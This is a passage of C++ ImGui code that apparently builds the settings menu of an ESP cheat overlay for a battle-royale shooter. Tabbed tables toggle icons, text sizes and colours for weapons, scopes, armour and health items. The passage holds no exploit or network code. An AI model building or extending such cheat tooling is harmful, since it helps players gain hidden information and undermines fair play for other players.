										Setting::Esp_Item_Holo_Icon = false;
										Setting::Esp_Item_x2_Icon = false;
										Setting::Esp_Item_x3_Icon = false;
										Setting::Esp_Item_x4_Icon = false;
										Setting::Esp_Item_x6_Icon = false;
										Setting::Esp_Item_x8_Icon = false;


										/////////////////////////////////////////////// Armors ////////////////////////////////////////////


										Setting::Esp_Item_Bag1_Icon = false;
										Setting::Esp_Item_Bag2_Icon = false;
										Setting::Esp_Item_Bag3_Icon = false;
										Setting::Esp_Item_Armor1_Icon = false;
										Setting::Esp_Item_Armor2_Icon = false;
										Setting::Esp_Item_Armor3_Icon = false;
										Setting::Esp_Item_Helmet1_Icon = false;
										Setting::Esp_Item_Helmet2_Icon = false;
										Setting::Esp_Item_Helmet3_Icon = false;


										/////////////////////////////////////////////// Grenade ////////////////////////////////////////////


										Setting::Esp_Item_Frag_Icon = false;
										Setting::Esp_Item_Frag_Warn_Icon = false;
										Setting::Esp_Item_Smoke_Warn_Icon = false;
										Setting::Esp_Item_Smoke_Icon = false;
										Setting::Esp_Item_Molotof_Icon = false;
										Setting::Esp_Item_Molotof_Warn_Icon = false;
										Setting::Esp_Item_Grenade_Apple_Icon = false;



										/////////////////////////////////////////////// Health ////////////////////////////////////////////


										Setting::Esp_Item_MedKit_Icon = false;
										Setting::Esp_Item_FirstAidKit_Icon = false;
										Setting::Esp_Item_Painkiller_Icon = false;
										Setting::Esp_Item_EnergyDrink_Icon = false;
										Setting::Esp_Item_AdrenalineSyringe_Icon = false;
										Setting::Esp_Item_Bandage_Icon = false;
										Setting::Esp_Item_AirDrop_Icon = false;
										Setting::Esp_Item_DeadBox_Icon = false;
										Setting::Esp_Item_AirAttack_Icon = false;

									}

									ImGui::SameLine();
									ImGui::Checkbox("Icon Bg", &Setting::Weapon_Icon_With_BG);
									if (Setting::Weapon_Icon_With_BG)
									{
										ImGui::SameLine();
										ImGui::ColorEdit4("###bgcolor", (float*)&bgcolor, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
									}
									ImGui::SameLine();
									ImGui::PushItemWidth(150);
									ImGui::SliderInt("##ItemDistance", &Setting::ItemDistance, 1, 100, "Item Distance : %0.1f");
									ImGui::SetCursorPos({74, 180 });

									ImGui::BeginChild("##1", ImVec2(570, 195), true, ImGuiWindowFlags_NoBackground);
									{
										if (ImGui::BeginTabBar("ITEMS"))
										{
											if (ImGui::BeginTabItem("Ar"))
											{

												if (ImGui::BeginTable("ITEM_AR", 4, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg))
												{
													ImGui::TableSetupColumn("Enable");
													ImGui::TableSetupColumn("Icon");
													//ImGui::TableSetupColumn("NAME");
													ImGui::TableSetupColumn("Font Size");
													ImGui::TableSetupColumn("Colors");
													ImGui::TableHeadersRow();

													ImGui::TableNextColumn();
													ImGui::Checkbox("M416", &Setting::Esp_Item_M416);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##MICON", &Setting::Esp_Item_M416_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::M416, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::PushItemWidth(160);
													ImGui::SliderFloat("##Esp_Item_M416_TextSize", &Setting::Esp_Item_M416_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("M416", (float*)&Setting::Esp_Item_M416_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("AKM", &Setting::Esp_Item_AKM);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##AKMIcon", &Setting::Esp_Item_AKM_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::AK, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_AKM_TextSize", &Setting::Esp_Item_AKM_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("AKM", (float*)&Setting::Esp_Item_AKM_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("M762", &Setting::Esp_Item_M762);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##M762Icon", &Setting::Esp_Item_M762_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::M762, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_M762_TextSize", &Setting::Esp_Item_M762_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("M762", (float*)&Setting::Esp_Item_M762_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("SCARL", &Setting::Esp_Item_SCARL);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##SCARLIcon", &Setting::Esp_Item_SCARL_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::SCARL, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_SCARL_TextSize", &Setting::Esp_Item_SCARL_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("SCARL", (float*)&Setting::Esp_Item_SCARL_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("M16A4", &Setting::Esp_Item_M16A4);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##M16A4Icon", &Setting::Esp_Item_M16A4_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::M16A4, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_M16A4_TextSize", &Setting::Esp_Item_M16A4_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("M16A4", (float*)&Setting::Esp_Item_M16A4_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("G36C", &Setting::Esp_Item_G36C);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##G36C_Icon", &Setting::Esp_Item_G36C_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::M16A4, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_G36C_TextSize", &Setting::Esp_Item_G36C_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("G36C", (float*)&Setting::Esp_Item_G36C_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("QBZ", &Setting::Esp_Item_QBZ);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##QBZ_Icon", &Setting::Esp_Item_QBZ_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::QBZ, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_QBZ_TextSize", &Setting::Esp_Item_QBZ_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("QBZ", (float*)&Setting::Esp_Item_QBZ_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Mk47", &Setting::Esp_Item_Mk47Mutant);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Mk47_Icon", &Setting::Esp_Item_Mk47Mutant_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::Mk47, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Mk47_TextSize", &Setting::Esp_Item_Mk47Mutant_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Mk47", (float*)&Setting::Esp_Item_Mk47Mutant_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("FAMAS", &Setting::Esp_Item_FAMAS);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##FAMAS_Icon", &Setting::Esp_Item_FAMAS_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::FAMAS, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_FAMAS_TextSize", &Setting::Esp_Item_FAMAS_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("FAMAS", (float*)&Setting::Esp_Item_FAMAS_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::EndTable();
												}
												ImGui::EndTabItem();
											}
											if (ImGui::BeginTabItem("Sr"))
											{
												if (ImGui::BeginTable("ITEM_SNIPERS", 4, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg))
												{
													ImGui::TableSetupColumn("Enable");
													ImGui::TableSetupColumn("Icon");
													//ImGui::TableSetupColumn("NAME");
													ImGui::TableSetupColumn("Font Size");
													ImGui::TableSetupColumn("Colors");
													ImGui::TableHeadersRow();

													ImGui::TableNextColumn();
													ImGui::Checkbox("M24", &Setting::Esp_Item_M24);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##M24_Icon", &Setting::Esp_Item_M24_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::M24, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::PushItemWidth(160);
													ImGui::SliderFloat("##Esp_Item_M24_TextSize", &Setting::Esp_Item_M24_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("M24", (float*)&Setting::Esp_Item_M24_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("KAR98k", &Setting::Esp_Item_Kar98k);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##KAR98k_Icon", &Setting::Esp_Item_Kar98k_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::Kar98, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Kar98k_TextSize", &Setting::Esp_Item_Kar98k_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("KAR98k", (float*)&Setting::Esp_Item_Kar98k_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("AWM", &Setting::Esp_Item_Awm);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##AWM_Icon", &Setting::Esp_Item_Awm_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::AWM, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Awm_TextSize", &Setting::Esp_Item_Awm_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("AWM", (float*)&Setting::Esp_Item_Awm_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::EndTable();
												}
												ImGui::EndTabItem();
											}
											if (ImGui::BeginTabItem("Dmr"))
											{
												if (ImGui::BeginTable("ITEM_SNIPERS_RIFELS", 4, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg))
												{
													ImGui::TableSetupColumn("Enable");
													ImGui::TableSetupColumn("Icon");
													//ImGui::TableSetupColumn("NAME");
													ImGui::TableSetupColumn("Font Size");
													ImGui::TableSetupColumn("Colors");
													ImGui::TableHeadersRow();

													ImGui::TableNextColumn();
													ImGui::Checkbox("QBU", &Setting::Esp_Item_QBU);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##QBU_Icon", &Setting::Esp_Item_QBU_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::QBU, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::PushItemWidth(160);
													ImGui::SliderFloat("##Esp_Item_QBU_TextSize", &Setting::Esp_Item_QBU_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("QBU", (float*)&Setting::Esp_Item_QBU_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("SLR", &Setting::Esp_Item_SLR);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##SLR_Icon", &Setting::Esp_Item_SLR_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::SLR, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_SLR_TextSize", &Setting::Esp_Item_SLR_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("SLR", (float*)&Setting::Esp_Item_SLR_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("SKS", &Setting::Esp_Item_SKS);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##SKS_Icon", &Setting::Esp_Item_SKS_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::SKS, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_SKS_TextSize", &Setting::Esp_Item_SKS_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("SKS", (float*)&Setting::Esp_Item_SKS_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("MK12", &Setting::Esp_Item_Mk12);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##MK12_Icon", &Setting::Esp_Item_Mk12_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::Mk12, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_MK12_TextSize", &Setting::Esp_Item_Mk12_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("MK12", (float*)&Setting::Esp_Item_Mk12_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Mini14", &Setting::Esp_Item_Mini14);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Mini14_Icon", &Setting::Esp_Item_Mini14_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::Mini14, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Mini14_TextSize", &Setting::Esp_Item_Mini14_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Mini14", (float*)&Setting::Esp_Item_Mini14_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("MK14", &Setting::Esp_Item_Mk14);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##MK14_Icon", &Setting::Esp_Item_Mk14_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::Mk14, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_MK14_TextSize", &Setting::Esp_Item_Mk14_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("MK14", (float*)&Setting::Esp_Item_Mk14_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::EndTable();
												}
												ImGui::EndTabItem();
											}
											if (ImGui::BeginTabItem("Smg"))
											{
												if (ImGui::BeginTable("ITEM_SMG", 4, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg))
												{
													ImGui::TableSetupColumn("Enable");
													ImGui::TableSetupColumn("Icon");
													//ImGui::TableSetupColumn("NAME");
													ImGui::TableSetupColumn("Font Size");
													ImGui::TableSetupColumn("Colors");
													ImGui::TableHeadersRow();

													ImGui::TableNextColumn();
													ImGui::Checkbox("PP19", &Setting::Esp_Item_PP19);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##PP19_Icon", &Setting::Esp_Item_PP19_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::PP19, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::PushItemWidth(160);
													ImGui::SliderFloat("##Esp_Item_PP19_TextSize", &Setting::Esp_Item_PP19_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("PP19", (float*)&Setting::Esp_Item_PP19_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("TommyGun", &Setting::Esp_Item_TommyGun);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##TommyGun_Icon", &Setting::Esp_Item_TommyGun_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::TommyGun, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_TommyGun_TextSize", &Setting::Esp_Item_TommyGun_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("TommyGun", (float*)&Setting::Esp_Item_TommyGun_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("MP5K", &Setting::Esp_Item_MP5K);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##MP5K_Icon", &Setting::Esp_Item_MP5K_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::TommyGun, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_MP5K_TextSize", &Setting::Esp_Item_MP5K_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("MP5K", (float*)&Setting::Esp_Item_MP5K_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("UMP9", &Setting::Esp_Item_UMP9);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##UMP9_Icon", &Setting::Esp_Item_UMP9_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::UMP9, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_UMP9_TextSize", &Setting::Esp_Item_UMP9_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("UMP9", (float*)&Setting::Esp_Item_UMP9_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Vector", &Setting::Esp_Item_Vector);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Vector_Icon", &Setting::Esp_Item_Vector_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::UMP9, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Vector_TextSize", &Setting::Esp_Item_Vector_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Vector", (float*)&Setting::Esp_Item_Vector_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Uzi", &Setting::Esp_Item_Uzi);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Uzi_Icon", &Setting::Esp_Item_Uzi_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::Uzi, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Uzi_TextSize", &Setting::Esp_Item_Uzi_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Uzi", (float*)&Setting::Esp_Item_Uzi_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::EndTable();
												}
												ImGui::EndTabItem();
											}
											if (ImGui::BeginTabItem("ShotGun"))
											{
												if (ImGui::BeginTable("ITEM_SHOTGUN", 4, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg))
												{
													ImGui::TableSetupColumn("Enable");
													ImGui::TableSetupColumn("Icon");
													//ImGui::TableSetupColumn("NAME");
													ImGui::TableSetupColumn("Font Size");
													ImGui::TableSetupColumn("Colors");
													ImGui::TableHeadersRow();

													ImGui::TableNextColumn();
													ImGui::Checkbox("S1897", &Setting::Esp_Item_S1897);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##S1897_Icon", &Setting::Esp_Item_S1897_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::S1897, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::PushItemWidth(160);
													ImGui::SliderFloat("##Esp_Item_S1897_TextSize", &Setting::Esp_Item_S1897_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("S1897", (float*)&Setting::Esp_Item_S1897_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("S686", &Setting::Esp_Item_S686);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##S686_Icon", &Setting::Esp_Item_S686_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::S686, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_S686_TextSize", &Setting::Esp_Item_S686_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("S686", (float*)&Setting::Esp_Item_S686_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("DBS", &Setting::Esp_Item_DBS);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##DBS_Icon", &Setting::Esp_Item_DBS_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::DBS, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_DBS_TextSize", &Setting::Esp_Item_DBS_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("DBS", (float*)&Setting::Esp_Item_DBS_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("S12K", &Setting::Esp_Item_S12K);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##S12K_Icon", &Setting::Esp_Item_S12K_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::S12K, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_S12K_TextSize", &Setting::Esp_Item_S12K_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("S12K", (float*)&Setting::Esp_Item_S12K_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("M1014", &Setting::Esp_Item_M1014);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##M1014_Icon", &Setting::Esp_Item_M1014_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::M1014, ImVec2(60, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_M1014_TextSize", &Setting::Esp_Item_M1014_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("M1014", (float*)&Setting::Esp_Item_M1014_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);


													ImGui::EndTable();
												}
												ImGui::EndTabItem();
											}
											if (ImGui::BeginTabItem("Pistols"))
											{
												if (ImGui::BeginTable("ITEM_PISTOLS", 4, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg))
												{
													ImGui::TableSetupColumn("Enable");
													ImGui::TableSetupColumn("Icon");
													//ImGui::TableSetupColumn("NAME");
													ImGui::TableSetupColumn("Font Size");
													ImGui::TableSetupColumn("Colors");
													ImGui::TableHeadersRow();

													ImGui::TableNextColumn();
													ImGui::Checkbox("DesertEagle", &Setting::Esp_Item_DesertEagle);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##DesertEagle_Icon", &Setting::Esp_Item_DesertEagle_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::DesertEagle, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::PushItemWidth(160);
													ImGui::SliderFloat("##Esp_Item_DesertEagle_TextSize", &Setting::Esp_Item_DesertEagle_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("DesertEagle", (float*)&Setting::Esp_Item_DesertEagle_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("P1911", &Setting::Esp_Item_P1911);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##P1911_Icon", &Setting::Esp_Item_P1911_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::P1911, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_P1911_TextSize", &Setting::Esp_Item_P1911_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("P1911", (float*)&Setting::Esp_Item_P1911_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("R45", &Setting::Esp_Item_R45);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##R45_Icon", &Setting::Esp_Item_R45_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::R45, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_R45_TextSize", &Setting::Esp_Item_R45_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("R45", (float*)&Setting::Esp_Item_R45_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("P18C", &Setting::Esp_Item_P18C);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##P18C_Icon", &Setting::Esp_Item_P18C_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::P18C, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_P18C_TextSize", &Setting::Esp_Item_P18C_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("P18C", (float*)&Setting::Esp_Item_P18C_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("P92", &Setting::Esp_Item_P92);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##P92_Icon", &Setting::Esp_Item_P92_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::P92, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_P92_TextSize", &Setting::Esp_Item_P92_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("P92", (float*)&Setting::Esp_Item_P92_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("FlareGun", &Setting::Esp_Item_FlareGun);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##FlareGun_Icon", &Setting::Esp_Item_FlareGun_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::Flaregun, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_FlareGun_TextSize", &Setting::Esp_Item_FlareGun_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("FlareGun", (float*)&Setting::Esp_Item_FlareGun_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);


													ImGui::EndTable();
												}
												ImGui::EndTabItem();
											}
											if (ImGui::BeginTabItem("Scopes"))
											{
												if (ImGui::BeginTable("ITEM_SCOPES", 4, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg))
												{
													ImGui::TableSetupColumn("Enable");
													ImGui::TableSetupColumn("Icon");
													//ImGui::TableSetupColumn("NAME");
													ImGui::TableSetupColumn("Font Size");
													ImGui::TableSetupColumn("Colors");
													ImGui::TableHeadersRow();

													ImGui::TableNextColumn();
													ImGui::Checkbox("RedDot", &Setting::Esp_Item_Lazer);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##RedDot_Icon", &Setting::Esp_Item_Lazer_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::RedDot, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::PushItemWidth(160);
													ImGui::SliderFloat("##Esp_Item_Lazer_TextSize", &Setting::Esp_Item_Lazer_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("RedDot", (float*)&Setting::Esp_Item_Lazer_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);

													ImGui::TableNextColumn();
													ImGui::Checkbox("Holo", &Setting::Esp_Item_Holo);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##Holo_Icon", &Setting::Esp_Item_Holo_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::Holo, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_Holo_TextSize", &Setting::Esp_Item_Holo_TextSize, 1, 50);
													ImGui::TableNextColumn();
													ImGui::ColorEdit4("Holo", (float*)&Setting::Esp_Item_Holo_Color, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);



													ImGui::TableNextColumn();
													ImGui::Checkbox("x2", &Setting::Esp_Item_x2);
													ImGui::TableNextColumn();
													ImGui::Checkbox("##x2_Icon", &Setting::Esp_Item_x2_Icon);
													ImGui::SameLine();
													ImGui::Image(DX11::S2X, ImVec2(30, 30));
													ImGui::TableNextColumn();
													ImGui::SliderFloat("##Esp_Item_x2_TextSize", &Setting::Esp_Item_x2_TextSize, 1, 50);
													ImGui::TableNextColumn();
